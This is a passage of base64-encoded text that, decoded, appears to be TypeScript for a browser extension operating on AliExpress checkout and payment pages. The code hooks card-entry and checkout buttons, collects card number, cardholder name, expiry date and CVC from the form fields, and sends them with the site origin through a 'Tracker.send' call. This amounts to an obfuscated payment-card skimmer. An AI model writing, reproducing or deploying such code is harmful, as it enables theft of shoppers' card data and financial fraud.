cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2RTdG9yZVswXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZFN0b3JlWzJdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHBheW1lbnRNZXRob2RTdG9yZVszXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1jYXJkJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtY2FyZCcpPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgX19pbnRlcnZhbDMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5uZXctY2FyZCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoX19pbnRlcnZhbDMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmFycm93LWNvbnRlbnQnKS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuYXJyb3ctY29udGVudCcpLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWREaXZFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWREaXZFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWREaXZFbGVtZW50LmNsYXNzTGlzdC5jb250YWlucygnYXJyb3ctZG93bicpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IF9faW50ZXJ2YWwyID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmFkZC1uZXctY2FyZCcpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwyKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5hZGQtbmV3LWNhcmQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgX19pbnRlcnZhbDMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKF9faW50ZXJ2YWwzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5taXgtZWRjYXJkLWl0ZW0nKT8uY2hpbGRFbGVtZW50Q291bnQgIT09IDApIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgY2FyZENvbmZpcm1FbGVtZW50ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NoZWNrb3V0LWJ1dHRvbicpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkQ29uZmlybUVsZW1lbnQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubWl4LWVkY2FyZC1pdGVtJyk/LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSA9PT0gJ1NQQU4nICYmIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdpY29uJykpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCd2aXNhJykpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6ICd2aXNhJ1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkubm9kZU5hbWUgPT09ICdTUEFOJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygncGF5LW5hbWUnKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2NoaWxkRWxlbWVudC50ZXh0Q29udGVudFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzFdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJ3BheVJlc3VsdC5odG0nKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbDQgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1mb3JtLXJvdycpICE9PSBudWxsKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWw0KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy52ZXJpZnktY2FyZC1jb25maXJtJyk/LmZpcnN0RWxlbWVudENoaWxkPy5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWNvbmZpcm0nKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudmVyaWZ5LWNhcmQtZm9ybS1yb3cnKSBhcyBIVE1MRWxlbWVudCksICdpbnB1dCcsICdjYXJkTicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnY2FyZEhvbGRlcicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnZXhwaXJlcycsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnZlcmlmeS1jYXJkLWZvcm0tcm93JykgYXMgSFRNTEVsZW1lbnQpLCAnaW5wdXQnLCAnY3ZjJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkLmluZGV4T2YoJ2NhcmROJykgIT09IC0xID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLmlkID09PSAnY2FyZEJyYW5kJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0uaWQgPT09ICdjYXJkSG9sZGVyJyA/IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZCA9PT0gJ2V4cGlyZXMnID8gdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS5pZCA9PT0gJ2N2YycgPyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgLyppZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290JykgIT09IG51bGwgJiYgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNoZWNrLW91dC1yb290Jyk/LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAxKSB7XG4gICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcbiAgICAgICAgICAgICAgICAgICAgbGV0IGludGVydmFsNCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudGl0bGUtdG8tZGV0YWlsJykgIT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsNCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy50aXRsZS10by1kZXRhaWwnKT8ubmV4dEVsZW1lbnRTaWJsaW5nPy50ZXh0Q29udGVudD8uaW5kZXhPZignQWRkIGEgbmV3IGNhcmQnKSAhPT0gLTEpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcudGl0bGUtdG8tZGV0YWlsJyk/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmRPblNlY29uZFBheW1lbnQoc2VsZik7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJpbmQtYnV0dG9uLXdyYXAgJyk/LmZpcnN0RWxlbWVudENoaWxkPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wcm9jZXNzQWxpRXhwcmVzc1BheW1lbnROZXdDYXJkT25TZWNvbmRQYXltZW50KHNlbGYpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgI